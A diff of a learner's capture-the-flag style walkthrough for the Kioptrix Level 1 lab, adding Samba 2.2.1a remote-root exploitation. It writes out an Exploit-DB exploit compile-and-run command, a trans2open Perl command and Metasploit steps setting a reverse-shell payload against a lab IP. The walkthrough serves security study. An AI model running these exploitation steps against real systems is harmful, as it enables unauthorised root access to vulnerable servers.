@@ -57,16 +57,32 @@ By Kioptrix
 * The above exploit was one of those that abatchy tried (but did not find working in this machine's instance), as seen in [his blog post on the same vulnerable machine](https://www.abatchy.com/2016/11/kioptrix-1-walkthrough-vulnhub).
 
 ## Samba Smbd Service at Port 139 ##
+
+### Remote Root Exploit (Non-Metasploit) ###
 * Running `enum4linux 10.0.2.12` quickly gave us a long list of results. We see `KIOPTRIX Wk Sv PrQ Unx NT SNT Samba Server` under the `OS Information` section, with OS version `4.5` running.
 ![](/screenshots/kioptrix-level-1/enum4linuxOsInformation.jpg)
 * **Re-visit/Question**: I read from kongwenbin's write-up that running the command should give us the OS information for the smbclient as well. Notice that ours is left blank as shown above. Crucially, it reveals that the Samba version is `2.2.1a`, and not 4.5 as what we thought!
-* Given this crucial piece of information, the first Google search result for `samba 2.2.1a exploit` was able to give me a `root` shell easily.
+* Given this crucial piece of information, the [first Google search result](https://www.exploit-db.com/exploits/10) for `samba 2.2.1a exploit` was able to give me a `root` shell easily - `Remote Code Execution`:
 ![](/screenshots/kioptrix-level-1/sambaExploitGoogleSearch.jpg)
 * After downloading and compiling the code (`gcc 10.c`), run `./a.out -b 0 10.0.2.12`:
 ![](/screenshots/kioptrix-level-1/sambaRemoteRootExploit.jpg)
 * Note: The `-b` parameter indicates the platform: `0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2`. Choosing any of the numbers except 3 would result in a `root` shell.
 * Note: Running `exit` seems to be a little buggy for me, i.e. the shell does not terminate immediately.
-* We also note the Share Enumeration results, where there are errors encountered when trying to "map shares". There was also a list of results for users and groups.
+
+### trans2open Overflow (Metasploit) ###
+* The [second Google search](https://www.exploit-db.com/exploits/7) result shows that the Samba version is also susceptible to a `Remote Buffer Overflow`, specifically a trans2open overflow. [A Rapid7 entry](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open) shows that there is a Metasploit module available pertaining to it for our use.
+* According to [a cvedetails page], the name of the exploit is due to a "buffer overflow in the call_trans2open function in trans2.c".
+* **Question**: Not exactly sure why the Perl script from the Exploit-DB page does not result in any shell despite running for around 10 minutes. My executed command was `perl 7.pl -t linx86 -H 10.0.2.6 -h 10.0.2.12`.
+* Searching with the keyword `trans2open` after running `msfconsole` gives us 4 results, with each being applicable to only the respective OSes. We will be using the one for `Linux x86` (**where did we get this piece of information? i.e. how do we know we should be using Linux?**)
+![](/screenshots/kioptrix-level-1/metasploitTrans2openModules.jpg)
+* Alternatively, instead of searching, we can directly use the information given in the Rapid7 page: `use exploit/linux/samba/trans2open`.
+* `options` tells us that we need to `set RHOSTS 10.0.2.12`. Running `exploit` immediately afterwards results in many meterpreter sessions being open and 'dying' instantly. `options` shows us that our default payload used was `linux/x86/meterpreter/reverse_tcp`:
+![](/screenshots/kioptrix-level-1/metasploitMeterpreterSessionsDying.jpg)
+* Changing the payload would solve the issue: `set payload generic/shell_reverse_tcp`. Run `exploit` next to get a `root` shell:
+![](/screenshots/kioptrix-level-1/metasploitReverseShell.jpg)
+
+### Other Attempts ###
+* The Share Enumeration results from `enum4linux` was also noted, where there are errors encountered when trying to "map shares". There was also a list of results for users and groups.
 * Running `smbmap -H 10.0.2.12` shows a single line of output, `[+] Finding open SMB ports....`, before the program terminates. Judging this against from what we see in `lazysysadmin`, the Kioptrix has only got one port (on 139) with the `netbios-ssn` service, as compared to the latter which has 2 ports (on 139 and 445), which probably explains the non-discovery of open SMB ports in this instance (I think).
 * Accessing `smb://10.0.2.12/` using the Kali Linux file explorer shows nothing. I had expected `IPC$` and `ADMIN$` to be showing up at least, as seen on `lazysysadmin`. However, in hindsight, since they were not found using `smbmap`, that could be the reason why we are not seeing them this way as well.
 ![](/screenshots/kioptrix-level-1/smbFolderNoFinding.jpg)
@@ -86,4 +102,4 @@ I wanted to work on this box as one of the first few boxes to start my journey t
 2. Learnt of the need to try out obvious options first before possibly having to go deeper to dig for answers (where the latter was unnecessary here).
 
 # Other Walkthrough References
-1. To-be-added
+1. https://kongwenbin.wordpress.com/2016/10/25/writeup-for-kioptrix-level-1/
